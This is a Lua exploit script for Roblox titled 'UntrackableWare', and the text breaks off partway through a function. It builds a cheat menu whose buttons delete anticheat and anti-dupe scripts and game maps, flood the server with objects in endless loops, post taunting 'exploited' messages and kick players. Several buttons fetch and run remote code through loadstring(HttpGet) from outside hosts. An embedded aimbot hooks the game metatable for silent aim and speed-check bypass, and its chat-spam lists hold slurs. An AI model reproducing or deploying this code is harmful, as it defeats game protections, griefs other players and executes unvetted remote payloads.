coroutine.wrap(DAZYEH_fake_script)()
local function BOFVXTZ_fake_script() -- Welcome.IsGameLoaded? 
	local script = Instance.new('Script', Welcome)

		local loaded = game.Loaded
	if not loaded then
		script.Parent.Visible = false
		else if loaded then
			script.Parent.Visible = true
		end
	end
	-- losing my midn
	if not loaded then
		error("UntrackableWare >> ".. game.Players.LocalPlayer.Name.." game is not loaded!")
	else if loaded then
			warn("UntrackableWare >> "..game.Players.LocalPlayer.Name.." game is loaded!")
		end
	end
end
coroutine.wrap(BOFVXTZ_fake_script)()
local function WYTZCO_fake_script() -- TextButton.Script 
	local script = Instance.new('Script', TextButton)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Visible = false
		wait(2)
		script.Parent.Parent.Parent.Main.Visible = true
	end)
end
coroutine.wrap(WYTZCO_fake_script)()
local function XOSSXAP_fake_script() -- TextLabel.Script 
	local script = Instance.new('Script', TextLabel)

	local p = script.Parent
	local player = game.Players
	
	p.Text = "Welcome ".. player.LocalPlayer.Name .."!"
end
coroutine.wrap(XOSSXAP_fake_script)()
local function EJGRU_fake_script() -- DA.Script 
	local script = Instance.new('Script', DA)

	script.Parent.MouseButton1Click:Connect(function()
		local sss = game.ServerScriptService
	
		sss.Anticheat:Destroy()
		sss.AdvancedAnticheat:Destroy()
		sss["Advanced Anticheat"]:Destroy()
		sss["Anti Cheat"]:Destroy()
		sss.YouNoCheat:Destroy()
		sss["a better anticheat lol"]:Destroy()
		sss.AnticheatSystem:Destroy()
		sss["Anticheat System"]:Destroy()
		sss.ServerMovement:Destroy()
		sss.ServerMovementChecker:Destroy()
		sss["You No Cheat"]:Destroy()
		sss.WalkspeedAntiCheat:Destroy()
		sss.ChatGPTAnticheat:Destroy()
		sss["Walk speed Anti Cheat"]:Destroy()
		sss["Better Anti Cheat"]:Destroy()
		sss["JailBreak AntiCheat"]:Destroy()
		sss["Custom AntiCheat"]:Destroy()
		sss["Voidz Anticheat"]:Destroy()
		sss["Wild Anticheat"]:Destroy()
		sss["Lunar Anticheat"]:Destroy()
		sss["Complex Anticheat"]:Destroy()
		sss["No Hacking Allowed"]:Destroy()
		sss.NoHackingAllowed:Destroy()
		local rs = game.ReplicatedStorage
		rs.Anticheat:Destroy()
		rs.AdvancedAnticheat:Destroy()
		rs["Advanced Anticheat"]:Destroy()
		rs["Anti Cheat"]:Destroy()
		rs.YouNoCheat:Destroy()
		rs["a better anticheat lol"]:Destroy()
		rs.AnticheatSystem:Destroy()
		rs["Anticheat System"]:Destroy()
		rs.ServerMovement:Destroy()
		rs.ServerMovementChecker:Destroy()
		rs["You No Cheat"]:Destroy()
		rs.WalkspeedAntiCheat:Destroy()
		rs.ChatGPTAnticheat:Destroy()
		rs["Walk speed Anti Cheat"]:Destroy()
		rs["Better Anti Cheat"]:Destroy()
		rs["JailBreak AntiCheat"]:Destroy()
		rs["Custom AntiCheat"]:Destroy()
		rs["Voidz Anticheat"]:Destroy()
		rs["Wild Anticheat"]:Destroy()
		rs["Lunar Anticheat"]:Destroy()
		rs["Complex Anticheat"]:Destroy()
		rs["No Hacking Allowed"]:Destroy()
		rs.NoHackingAllowed:Destroy()
		local ss = game.ServerStorage
		ss.Anticheat:Destroy()
		ss.AdvancedAnticheat:Destroy()
		ss["Advanced Anticheat"]:Destroy()
		ss["Anti Cheat"]:Destroy()
		ss.YouNoCheat:Destroy()
		ss["a better anticheat lol"]:Destroy()
		ss.AnticheatSystem:Destroy()
		ss["Anticheat System"]:Destroy()
		ss.ServerMovement:Destroy()
		ss.ServerMovementChecker:Destroy()
		ss["You No Cheat"]:Destroy()
		ss.WalkspeedAntiCheat:Destroy()
		ss.ChatGPTAnticheat:Destroy()
		ss["Walk speed Anti Cheat"]:Destroy()
		ss["Better Anti Cheat"]:Destroy()
		ss["JailBreak AntiCheat"]:Destroy()
		ss["Custom AntiCheat"]:Destroy()
		ss["Voidz Anticheat"]:Destroy()
		ss["Wild Anticheat"]:Destroy()
		ss["Lunar Anticheat"]:Destroy()
		ss["Complex Anticheat"]:Destroy()
		ss["No Hacking Allowed"]:Destroy()
		ss.NoHackingAllowed:Destroy()
	
	
		-- for extras
	
		local ws = game.workspace
		ws["HD Admin"]:Destroy()
		
		local rf = game.ReplicatedFirst
		rf["AntiHack System"]:Destroy()
		rf["Anti Hack System"]:Destroy()
		rf["AntiHaxx"]:Destroy()
		rf["Anti Haxx"]:Destroy()
		rf["Anti Hax"]:Destroy()
		rf["Anti Hacks"]:Destroy()
		rf["Anti Hack"]:Destroy()
		
		-- Anti duping deleter 999999999999999999999999999
		rf["Anti Duping"]:Destroy()
		rf.AntiDuping:Destroy()
		rf["Anti Dupe"]:Destroy()
		rf.AntiDupe:Destroy()
		ws.AntiDupe:Destroy()
		ws["Anti Dupe"]:Destroy()
		ws.AntiDuping:Destroy()
		ws["Anti Duping"]:Destroy()
		sss["Anti Dupe"]:Destroy()
		sss.AntiDupe:Destroy()
		sss["Anti Duping"]:Destroy()
		sss.AntiDuping:Destroy()
		-- pee ies eksx special
		sss.Pets:Destroy()
		rf.Pets:Destroy()
		rs.Pets:Destroy()
		ss.Pets:Destroy()
		workspace.Map:Destroy() -- you need to unlock all the maps for this one
		workspace.Maps:Destroy() -- you need to unlock all the maps for this one
		workspace.Map__:Destroy() -- you need to unlock all the maps for this one
		workspace.Map_:Destroy() -- you need to unlock all the maps for this one
		workspace.Maps__:Destroy() -- you need to unlock all the maps for this one
		workspace.Maps_:Destroy() -- you need to unlock all the maps for this one
		workspace.Pets:Destroy() -- Workspace pet deleter
		workspace.Pet:Destroy() -- Workspace pet deleter
	end)
end
coroutine.wrap(EJGRU_fake_script)()
local function LSILL_fake_script() -- WSD.Script 
	local script = Instance.new('Script', WSD)

	script.Parent.MouseButton1Click:Connect(function()
		-- hehehehhe
		local rs = game.Workspace
		while true do
			wait(2)
			local scrip = Instance.new("Script")
			scrip.Parent = rs
			scrip.Name = "»»«««‚®®’‘'»=“⁑⁝‴ª´^‖^♪♪±±~~‖※"
			scrip.Disabled = true
			wait(4)
			scrip:Remove()
			-- nex on11!1
			local brick = Instance.new("Part")
			brick.Parent = rs
			brick.Name = "»»«««‚®®’‘'»=“⁑⁝‴ª´^‖^♪♪±±~~‖※"
			wait(4)
			brick:Remove()
		end
	end)
end
coroutine.wrap(LSILL_fake_script)()
local function HXRUQ_fake_script() -- SSSD.Script 
	local script = Instance.new('Script', SSSD)

	script.Parent.MouseButton1Click:Connect(function()
		-- hehehehhe
		local ss = game.ServerScriptService
		while true do
			wait(2)
			local scrip = Instance.new("Script")
			scrip.Parent = ss
			scrip.Name = "L_[M[\FA\z/O^_^:-Dಥ_ಥ»»«««‚®®’‘'»=“⁑⁝‴ª´^‖^♪♪±±~~‖※"
			scrip.Disabled = true
			wait(10)
			scrip:Remove()
		end
	end)
end
coroutine.wrap(HXRUQ_fake_script)()
local function GERGTN_fake_script() -- GC.Script 
	local script = Instance.new('Script', GC)

	script.Parent.MouseButton1Click:Connect(function()
		-- hehehehhe
		local ss = game.ServerStorage
		while true do
			local scrip = Instance.new("Script")
			scrip.Parent = ss
			scrip.Name = "(⊙_⊙;)(⊙_⊙;)(⊙_⊙;)(⊙_⊙;)(⊙_⊙;)(⊙_⊙;)(⊙_⊙;)(\⊙_⊙/)(⊙_⊙;)(⊙_⊙;)(⊙_⊙;)(⊙_⊙;)"
			scrip.Disabled = true
		end
	end)
end
coroutine.wrap(GERGTN_fake_script)()
local function VUVN_fake_script() -- FRC.Script 
	local script = Instance.new('Script', FRC)

	script.Parent.MouseButton1Click:Connect(function()
		wait(4)
		local remote = Instance.new("RemoteEvent", game.ReplicatedStorage)
		remote.Name = "ServerMessage"
		while wait(2) do
			local player = game.Players
			remote:FireAllClients("[UntrackableWare] UntrackableWare is here!", Color3.fromRGB(255, 0, 0), Enum.FontSize.Size32)
		end
	end)
end
coroutine.wrap(VUVN_fake_script)()
local function IEIXN_fake_script() -- iy.Script 
	local script = Instance.new('Script', iy)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
	end)
end
coroutine.wrap(IEIXN_fake_script)()
local function ZIZR_fake_script() -- DD.Script 
	local script = Instance.new('Script', DD)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua", true))()
	end)
end
coroutine.wrap(ZIZR_fake_script)()
local function IWFATBX_fake_script() -- CH.Script 
	local script = Instance.new('Script', CH)

	script.Parent.MouseButton1Click:Connect(function()
		local chframe = script.Parent.Parent.Parent.Parent["Cheat hub"]
		chframe.Visible = true
	end)
end
coroutine.wrap(IWFATBX_fake_script)()
local function XQFO_fake_script() -- KY.Script 
	local script = Instance.new('Script', KY)

	script.Parent.MouseButton1Click:Connect(function()
		local player = game.Players
		local localplayer = player.LocalPlayer
		wait(2)
		localplayer:Kick(localplayer.Name.. "has been kicked by >> UntrackableWare")
	end)
end
coroutine.wrap(XQFO_fake_script)()
local function CHISW_fake_script() -- EC.Script 
	local script = Instance.new('Script', EC)

	script.Parent.MouseButton1Click:Connect(function()
		game.Players.PlayerAdded:Connect(function(plr)
			plr.CharacterAdded:Connect(function(char)
				local char = game.Players.LocalPlayer.Character
				for _, part in char:GetDescendants() do
					if part:IsA("BasePart") or part:IsA("MeshPart") then
						part.CanCollide = true
					end
				end
			end)
		end)
	end)
end
coroutine.wrap(CHISW_fake_script)()
local function PZZKIW_fake_script() -- FC.Script 
	local script = Instance.new('Script', FC)

	script.Parent.MouseButton1Click:Connect(function()
		local players = game:GetService("Players")
		local youchar = players.LocalPlayer.Character
		
		local fire = Instance.new("Fire")
		-- propertizs
		fire.Parent = youchar
		fire.Heat = 0
		fire.Color = Color3.new(1, 0, 0.0156863)
		fire.Size = 7
		fire.TimeScale = 4
	end)
end
coroutine.wrap(PZZKIW_fake_script)()
local function ONHQXJ_fake_script() -- HM.Script 
	local script = Instance.new('Script', HM)

	script.Parent.MouseButton1Click:Connect(function()
		local h = Instance.new("Hint")
		h.Parent = game.Players.LocalPlayer:FindFirstChildOfClass("Workspace") 
		h.Text = "The game has been exploited by Team Untrackable, hahaha, try us!"
		wait(10)
		h:Remove()
		wait(3)
		local h = Instance.new("Hint")
		h.Parent = game.Players.LocalPlayer:FindFirstChildOfClass("Workspace") 
		h.Text = "The game is trash!, Its has been exploited by Team Untrackable, FIND A BETTER ANTICHEAT LOLLL!11!!1"
		wait(10)
		h:Remove()
	end)
end
coroutine.wrap(ONHQXJ_fake_script)()
local function KFLCM_fake_script() -- BC.Script 
	local script = Instance.new('Script', BC)

	script.Parent.MouseButton1Click:Connect(function()
		local h = Instance.new("Message")
		h.Parent = game.Players.LocalPlayer:FindFirstChildOfClass("Workspace") 
		h.Text = "The game has been exploited by Team Untrackable, hahaha, try us!"
		wait(10)
		h:Remove()
		wait(2)
		h.Parent = game.Players.LocalPlayer:FindFirstChildOfClass("Workspace") 
		h.Text = "Find a better anticheat bro!, The game is litteraly exploited by Team Untrackable!"
		wait(10)
		h:Remove()
		wait(2)
		h.Parent = game.Players.LocalPlayer:FindFirstChildOfClass("Workspace") 
		h.Text = "UntrackableWare is made by CrystalzzDEV on youtube!, get virus for free HAHA"
		wait(10)
		h:Remove()
	end)
end
coroutine.wrap(KFLCM_fake_script)()
local function ECNUR_fake_script() -- DC.Script 
	local script = Instance.new('Script', DC)

	script.Parent.MouseButton1Click:Connect(function()
		local player = game:GetService("Players")
		local lplayer = player.LocalPlayer
		lplayer:Kick("Disconnected")
	end)
end
coroutine.wrap(ECNUR_fake_script)()
local function YVTTX_fake_script() -- Main.read 
	local script = Instance.new('Script', Main)

	--[[
	
	hi if you are reading this that means you are LOOKING at the files to find some 'virus'. No, this is not an executor.
	And why would i give a virus to you.. but if you are looking the files to 'COPY' it, please don't, we worked hard for this.
	Thank you for reading :)
	have a nice day!
	- CrystalzzDEV
	
	--]]
end
coroutine.wrap(YVTTX_fake_script)()
local function METUBNA_fake_script() -- Main.Script 
	local script = Instance.new('Script', Main)

	local z = script.Parent
	
	z.Active = true
	z.Selectable = true
	z.Draggable = true
end
coroutine.wrap(METUBNA_fake_script)()
local function UZMHI_fake_script() -- Main.ifmouse 
	local script = Instance.new('Script', Main)

	script.Parent.MouseLeave:Connect(function()
		script.Parent.BackgroundColor3 = 0.5
	end)
	wait(2)
	script.Parent.MouseEnter:Connect(function()
		script.Parent.BackgroundColor3 = 0
	end)
end
coroutine.wrap(UZMHI_fake_script)()
local function KMIJOV_fake_script() -- Cheathub.ifmouse 
	local script = Instance.new('Script', Cheathub)

	script.Parent.MouseLeave:Connect(function()
		script.Parent.BackgroundColor3 = 0.5
	end)
	wait(2)
	script.Parent.MouseEnter:Connect(function()
		script.Parent.BackgroundColor3 = 0
	end)
end
coroutine.wrap(KMIJOV_fake_script)()
local function RWORMC_fake_script() -- Cheathub.Script 
	local script = Instance.new('Script', Cheathub)

	local z = script.Parent
	
	z.Active = true
	z.Selectable = true
	z.Draggable = true
end
coroutine.wrap(RWORMC_fake_script)()
local function PTYJLYE_fake_script() -- PSX.Script 
	local script = Instance.new('Script', PSX)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGetAsync("https://blacktrap.org/blacktrap/users/checkpoint/Auth.txt"))()
	end)
end
coroutine.wrap(PTYJLYE_fake_script)()
local function FRUW_fake_script() -- mm2.Script 
	local script = Instance.new('Script', mm2)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:GetObjects("rbxassetid://4001118261")[1].Source)()
	end)
end
coroutine.wrap(FRUW_fake_script)()
local function RBISJA_fake_script() -- los.Script 
	local script = Instance.new('Script', los)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ReeAndArceus/Legends-Of-Speed-Gui/main/Gui"))() 
	end)
end
coroutine.wrap(RBISJA_fake_script)()
local function ABXIYQE_fake_script() -- brookhaven.Script 
	local script = Instance.new('Script', brookhaven)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMael7/NewIceHub/main/Brookhaven"))()
	end)
end
coroutine.wrap(ABXIYQE_fake_script)()
local function WUKW_fake_script() -- sb.Script 
	local script = Instance.new('Script', sb)

	--eeee
	
	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomScriptr3/gggggggg/main/lolez.txt", true))()
	end)
end
coroutine.wrap(WUKW_fake_script)()
local function OQNSCJF_fake_script() -- ars.Script 
	local script = Instance.new('Script', ars)

	script.Parent.MouseButton1Click:Connect(function()
		local library = loadstring(game:HttpGet("https://pastebin.com/raw/qwdPKKDN"))()
		local venyx = library.new("HAMEWARE", 5013109572)
	
		local themes = {
			Background = Color3.fromRGB(24, 24, 24),
			Glow = Color3.fromRGB(0, 0, 0),
			Accent = Color3.fromRGB(10, 10, 10),
			LightContrast = Color3.fromRGB(20, 20, 20),
			DarkContrast = Color3.fromRGB(14, 14, 14),
			TextColor = Color3.fromRGB(255, 255, 255)
		}
	
		--Coded by Tyris & Doiv (void)
		local mouse = game.Players.LocalPlayer:GetMouse()
		local BodyParts = {'LeftFoot', 'LeftHand', 'LeftLowerArm', 'LeftLowerLeg', 'LeftUpperArm', 'LeftUpperLeg', 'LowerTorso', 'RightFoot', 'RightHand', 'RightLowerArm', 'RightLowerLeg', 'RightUpperLeg', 'RightUpperArm', 'UpperTorso', 'Head'}
		local invitecode = "hamware"
		local HAMEWARE_Chatspam = {"HAMEWARE ON TOP!", "OWNING ANY OTHER CHEAT THEN HAMEWARE MAKES YOU AN IDIOT LIBERAL", "HAMEWARE PENCE 2020", "HAMEWARE WINNING", "GET GOOD GET HAMEWARE", "discoard.gg/"..invitecode.." discoard.gg/"..invitecode.." discoard.gg/"..invitecode.." discoard.gg/"..invitecode.." discoard.gg/"..invitecode.." discoard.gg/"..invitecode.." discoard.gg/"..invitecode.." discoard.gg/"..invitecode.." discoard.gg/"..invitecode, "HAMEWARE | TWO STUDS AHEAD OF THE GAME"}
		local Furry_Chatspam = {'UwU Sowwiez! Im using hameware and owning youwww </3', 'OwO hameware is tapping aww of youw fwiends :c', 'e.e you arent using hameware?? Dat makes meh angwy!!! >:c', '>.< I am tapping eyes closed with hameware~', ':3 come get hameware! discoard.gg/'..invitecode, 'OvO hameware is slotted!! C:', 'UvU no challenge for hameware! </3'}
		local Swiss_Chatspam = {'SalÃ¼ zÃ¤mme Ig bin en schwiizer.', 'Hei u-huara dreck isch denn da imfall', 'Ier sing alli extrem schlecht i dem spiil lol', 'Wa wennd ier eigentlich, ich bin eh besser also leafet doch???', 'Han kei bock meh gege euch spiele, ier sind alli extrem schlecht', 'Boah alter in zuri hets boes fuetz!', 'Ig schwoer hameware isch immer ontop!', 'Hameware isch de best script wo nid full-public isch', 'holl der doch hameware! discord.gg/'..invitecode}
		local HvH_Chatspam = {"HHHHHH D0g owned by Hameware user hhh", "No Hameware no talk dog LLLL", "hhhh imagine not owning hameware NN dog 2k20 Hamewareless", "come 5v5 dumb dog", "Absolute dog hhhh no Hameware no talk nn", "I'm hvh legende so shhhh", "hdf eins du hs", 'einsclick hdf hund', 'schnauze nn ich bin hvh legende', 'Hvh legend here', 'Hameware hameware nr #1 cheat', 'Antiaim top of the game'}
		local China_Chatspam = {"HAMEWAREæä½³", "HAMEWAREä¸è¡£", "èæ¬é»å®¢è½¯ä»¶", "äºé©¬é", "æ·éè", "æåæºé»å®¢hameware", "å¤©å®é¨å¹¿åºæ¯åçï¼ä¸é¢æhameware, tianamen square", "ä¹æ²»Â·å¼æ´ä¼å¾·", "ç·äººå¥³äººç«ä¸­å½é¡¶", "å¯æçé»äºº", "æ¯ç²è´´è½¯ä»¶", "xå¼å¾", "æ°´å°ç", "é´èææ¯", "é»è²çæ´»æ æè°BLM", "femboyesæ¯åæ§æ"}
		local uion = true
		local circle = Drawing.new("Circle")
		local LP = game:GetService("Players").LocalPlayer
		circle.Visible = false
		local fakeanim = Instance.new('Animation', workspace)
		fakeanim.AnimationId = 'rbxassetid://0'
		local userInputService = game:GetService("UserInputService")
		userInputService.MouseBehavior = Enum.MouseBehavior.Default
	
		local target;
		local bodyname;
		local ChatDebounce = false
		local NameTags_Toggled = false
		local ArmChams = false
		local WeaponChams = false
		local ArmMaterial = 'Plastic'
		local WeaponMaterial = 'Plastic'
		local debris = game:GetService("Workspace").Debris
		local SilentAimFOV_Thickness = 1
		local Show_SILENTAIMFOV = false
		local CollectDebris = false
		local SilentAim_Toggled = false
		local NoAnims_Toggle = false
		local Teamcheck_Toggled = false
		local Visuals_Toggled = false
		local Chams_Toggled = false
		local SilentAimFOV_Filled = false
		local AntiAim_Toggle = false
		local isthirdperson = false
		local ChatSpam = false
		local Movement_Toggled = false
		local Bhop_Toggled = false
		local Chatspam_Toggled = false
		local Bhop_Speed = 1
		local Chatspam_Wait = 1
		local Chatspam_Type = nil
		local SilentAim_FOV = 0
		local SilentAimFOV_Transparency = 0
		local silentaim_headhitchance = 0
		local silentaim_bodyhitchance = 0
		local Pitch_Type = nil
		local Yaw_Type = nil
		local AntiAim_Speed = 0
		local CustomPitch_Value = 0
		local ArmChams_Color = Color3.new(50, 50, 50)
		local WeaponChams_Color = Color3.new(50, 50, 50)
		local SilentAimFOV_Numsides = 3
		local CustomYaw_Value = 0
		local leftrotation = CFrame.new(-150, 0, 0)
		local rightrotation = CFrame.new(150, 0, 0)
		local backrotation = CFrame.new(-4, 0, 0)
		local ChamsColor = Color3.fromRGB(50, 50, 50)
		local SilentAimFOV_Color = Color3.fromRGB(50, 50, 50)
		local defaultvector = Vector2.new(workspace.CurrentCamera.ViewportSize.X / 2, workspace.CurrentCamera.ViewportSize.Y / 2)
		local hed = Instance.new('Part', workspace.Terrain)
		local rhead = Instance.new('Part', hed)
		local rtors = Instance.new('Part', hed)
		rhead.Name = "Head"
		rtors.Name = 'UpperTorso'
	
		local page = venyx:addPage("Aimbot", 5892773989)
		local section1 = page:addSection("Silent Aimbot")
		local section2 = page:addSection("Silent Aimbot Settings")
		local addonsectionAIMBOT = page:addSection("Targets")
		local addonsectionAIMBOTVisuals = page:addSection("Targets")
	
		section1:addToggle("Silent Aimbot", nil, function(value)
			SilentAim_Toggled = value
		end)
	
		addonsectionAIMBOTVisuals:addToggle("Show SilentAim FOV", nil, function(value)
			Show_SILENTAIMFOV = value
		end)
	
		addonsectionAIMBOTVisuals:addToggle("SilentAim FOV Filled", nil, function(value)
			SilentAimFOV_Filled = value
		end)
	
		addonsectionAIMBOTVisuals:addSlider("SilentAim FOV Thickness", 1, 1, 5, function(value)
			SilentAimFOV_Thickness = value
		end)
	
		addonsectionAIMBOTVisuals:addSlider("SilentAim FOV numsides", 3, 3, 100, function(value)
			SilentAimFOV_Numsides = value
		end)
	
		addonsectionAIMBOTVisuals:addSlider("SilentAim FOV Transparency", 0, 0, 100, function(value)
			SilentAimFOV_Transparency = value
		end)
	
		addonsectionAIMBOTVisuals:addColorPicker('SilentAim FOV Color', Color3.fromRGB(50, 50, 50), function(color3)
			SilentAimFOV_Color = color3
		end)
	
		addonsectionAIMBOT:addToggle("TeamCheck", nil, function(value)
			Teamcheck_Toggled = value
		end)
	
		section2:addSlider("Silent Aimbot FOV", 0, 0, 500, function(value)
			SilentAim_FOV = value
		end)
	
		section2:addSlider("Head hitchance", 0, 0, 100, function(value)
			silentaim_headhitchance = value
		end)
	
		section2:addSlider("Body hitchance", 0, 0, 100, function(value)
			silentaim_bodyhitchance = value
		end)
	
		local Visuals = venyx:addPage("Visuals", 5892783507)
		local section3 = Visuals:addSection("Chams")
		local addonsectionVISUALS = Visuals:addSection("Local")
	
		section3:addToggle("Visuals", nil, function(value)
			Visuals_Toggled = value
		end)
	
		section3:addToggle("Nametag Esp", nil, function(value)
			NameTags_Toggled = value
		end)
	
		section3:addToggle("Chams", nil, function(value)
			Chams_Toggled = value
		end)
	
		section3:addColorPicker('Chams Color', Color3.fromRGB(50, 50, 50), function(color3)
			ChamsColor = color3
		end)
	
	
		addonsectionVISUALS:addKeybind("ThirdPerson keybind", Enum.KeyCode.X, function()
			if not isthirdperson then
				isthirdperson = true
			else
				isthirdperson = false
			end
	
		end, function()
		end)
	
	
	
	
		addonsectionVISUALS:addToggle("Arm Chams", nil, function(value)
			ArmChams = value
		end)
	
		addonsectionVISUALS:addToggle('Weapon Chams', nil, function(value)
			WeaponChams = value
		end)
	
		addonsectionVISUALS:addColorPicker('Arm Color', Color3.fromRGB(50, 50, 50), function(color3)
			ArmChams_Color = color3
		end)
	
		addonsectionVISUALS:addColorPicker('Weapon Color', Color3.fromRGB(50, 50, 50), function(color3)
			WeaponChams_Color = color3
		end)
	
		addonsectionVISUALS:addDropdown("Arm Material", {"Plastic", "ForceField", "Wood", "Grass"}, function(text)
			ArmMaterial = text
		end)
	
		addonsectionVISUALS:addDropdown("Weapon Material", {"Plastic", "ForceField", "Wood", "Grass"}, function(text)
			WeaponMaterial = text
		end)
	
	
		local AAPage = venyx:addPage("Anti-Aim", 5012544693)
		local section4 = AAPage:addSection("Main")
		local section5 = AAPage:addSection("Pitch")
		local section6 = AAPage:addSection("Yaw")
	
		section4:addToggle("AntiAim Toggle", nil, function(value)
			AntiAim_Toggle = value
		end)
	
		section4:addToggle("Disable Animations", nil, function(value)
			NoAnims_Toggle = value
		end)
	
		section5:addDropdown("Pitch Type", {"Custom", "Up", "Down", "Zero"}, function(text)
			Pitch_Type = text
		end)
	
		section5:addSlider("Pitch Value", 0, -150, 150, function(value)
			CustomPitch_Value = value / 100
		end)
	
		section6:addDropdown("Yaw Type", {"Custom", "Jitter", "Spin", "Back"}, function(text)
			Yaw_Type = text
		end)
	
		section6:addSlider('Spin Speed', 0, 0, 100, function(value)
			AntiAim_Speed = value
		end)
	
		section6:addSlider("Yaw Value", 0, 0, 360, function(value)
			CustomYaw_Value = value
		end)
	
		local Misc = venyx:addPage("Misc", 5894272440)
		local Movement = Misc:addSection("Movement")
		local Troll = Misc:addSection("Trolle")
		local MiscLocal = Misc:addSection("Local")
	
		MiscLocal:addToggle("Collect Debris", nil, function(value)
			CollectDebris = value
		end)
	
		Movement:addToggle("Movement Modifiers", nil, function(value)
			Movement_Toggled = value
		end)
	
		Movement:addToggle("Bhop", nil, function(value)
			Bhop_Toggled = value
		end)
	
		Movement:addSlider("Bhop Speed", 1, 0, 100, function(value)
			Bhop_Speed = value
		end)
	
		Troll:addToggle("Troll Features", nil, function(value)
			local Troll_Toggled = value
		end)
	
		Troll:addToggle("Chatspam", nil, function(value)
			Chatspam_Toggled = value
		end)
	
		Troll:addDropdown("Chatspam Type", {"HAMEWARE", "Furry", "Swiss", "HvH", "China"}, function(text)
			Chatspam_Type = text
		end)
	
		Troll:addSlider("Chatspam Sleep", 1, 1, 10, function(value)
			Chatspam_Wait = value
		end)
	
	
		local theme = venyx:addPage("GUI", 5012543246)
		local colors = theme:addSection("Colors")
		local uitogl = theme:addSection("UI Toggle")
	
		uitogl:addKeybind("GUI Toggle Keybind", Enum.KeyCode.Insert, function(val)
			if uion then
				userInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
				uion = false
			else
				userInputService.MouseBehavior = Enum.MouseBehavior.Default
				uion = true
			end
			venyx:toggle()
		end, function()
		end)
	
		for theme, color in pairs(themes) do
			colors:addColorPicker(theme, color, function(color3)
				venyx:setTheme(theme, color3)
			end)
		end
	
		venyx:SelectPage(venyx.pages[1], true)
	
		local function BulletTracer(ray)
	
			local mid = ray.Origin + ray.Direction/2
	
			if workspace.Camera:FindFirstChild("Arms") then
				if workspace.Camera.Arms:FindFirstChild("Bullet") then
					local pr = Instance.new("Part")
					pr.Parent = workspace
					pr.Anchored = true
					pr.CFrame = CFrame.new(mid, ray.Origin)
					pr.Size = Vector3.new(BulletTracer_Thickness, BulletTracer_Thickness, ray.Direction.Magnitude)
					pr.Color = BulletTracers_Color
					pr.Transparency = BulletTracers_Transparency
					pr.Material = Enum.Material.Neon
					print('Rayd')
					wait(3)
					pr:Destroy()
				end
			end
	
		end
	
	
		local function convert_rgb_to_vertex(c3)
			return Vector3.new(c3.R, c3.G, c3.B)
		end
		local mt = getrawmetatable(game)
		local oldNamecall = mt.__namecall
		local oldIndex = mt.__index
		if setreadonly then
			setreadonly(mt, false)
		else
			make_writeable(mt, true)
		end
		local namecallMethod = getnamecallmethod or get_namecall_method
		local newClose = newcclosure or function(f)
			return f
		end
		mt.__namecall = newClose(function(...)
			local method = namecallMethod()
			local args = {...}
	
			if method == "FindPartOnRayWithIgnoreList" then
				if SilentAim_Toggled then
					args[2] = Ray.new(workspace.CurrentCamera.CFrame.Position, (target[bodyname].CFrame.p - workspace.CurrentCamera.CFrame.Position).unit * 500)
				end
			elseif method == 'LoadAnimation' and tostring(args[2]) == 'RunForward' or tostring(args[2]) == 'RunBackward' or
				tostring(args[2]) == 'RunLeft' or tostring(args[2]) == 'RunRight' then
				if NoAnims_Toggle then
					args[2] = fakeanim
				end
			elseif method == 'FireServer' and tostring(args[1]) == "ControlTurn" then
				if AntiAim_Toggle then
					if Pitch_Type == "Custom" then
						args[2] = CustomPitch_Value
					elseif Pitch_Type == 'Down' then
						args[2] = -1.5
					elseif Pitch_Type == "Up" then
						args[2] = 1.5
					elseif Pitch_Type == "Zero" then
						args[2] = 0
					end
				end
			end
	
			return oldNamecall(unpack(args))
		end)
	
		mt.__index = newcclosure(function(self, ...)
			local arg = {...}
	
			if isthirdperson then
				if arg[1] == 'CameraMode' then
					return Enum.CameraMode.Classic
				end
			end
	
	
			return oldIndex(self, ...)
		end)
		local newmt = mt.__newindex
		local namecall = mt.__namecall
		setreadonly(mt,false)
		newmt = newcclosure(function(self,args,value)
			if checkcaller() then
				return new(self,args,value)
			end
			if args:lower() == "walkspeed" or args == "WalkSpeed" then
				return
			end
			return newmt(self,args,value)
		end)
	
	
		if setreadonly then
			setreadonly(mt, true)
		else
			make_writeable(mt, false)
		end
	
		function characterrotate(pos)
			pcall(function()
				if game.Players.LocalPlayer.Character then
					game.Players.LocalPlayer.Character.Humanoid.AutoRotate = false
					local gyro = Instance.new('BodyGyro')
					gyro.D = 0
					gyro.P = 1000000
					gyro.MaxTorque = Vector3.new(0, 1000000, 0)
					gyro.Parent = game.Players.LocalPlayer.Character.UpperTorso
					gyro.CFrame = CFrame.new(gyro.Parent.Position, pos)
					wait()
					gyro:Destroy()
				end
			end)
		end
	
		function GetTarget()
			local fob = SilentAim_FOV
			local nearestcharacter = nil
			pcall(function()
				local t = nil
				local m = LP:GetMouse()
				for _, PL in pairs(game.Players:GetPlayers()) do
					if PL.Character and PL.Character:FindFirstChild("Head") then
						if PL ~= LP then
							if Teamcheck_Toggled == false then
								if PL ~= nearestcharacter then
									local vector, onScreen = workspace.CurrentCamera:WorldToScreenPoint(PL.Character.Head.CFrame.p)
									local dist = (Vector2.new(vector.X, vector.Y) - Vector2.new(m.X, m.Y)).Magnitude
									if dist < fob then
										if 0 < PL.Character.Humanoid.Health then
											nearestcharacter = PL.Character
											fob = dist
										end
									end
								end
							else
								if PL.TeamColor ~= LP.TeamColor then
									if PL ~= nearestcharacter then
										local vector, onScreen = workspace.CurrentCamera:WorldToScreenPoint(PL.Character.Head.CFrame.p)
										local dist = (Vector2.new(vector.X, vector.Y) - Vector2.new(m.X, m.Y)).Magnitude
										if dist < fob then
											if 0 < PL.Character.Humanoid.Health then
												nearestcharacter = PL.Character
												fob = dist
											end
										end
									end
								end
							end
						end
					end
				end
			end)
			return nearestcharacter
		end
	
		function isInTable(table, tofind)
			local found = false
			for _,v in pairs(table) do
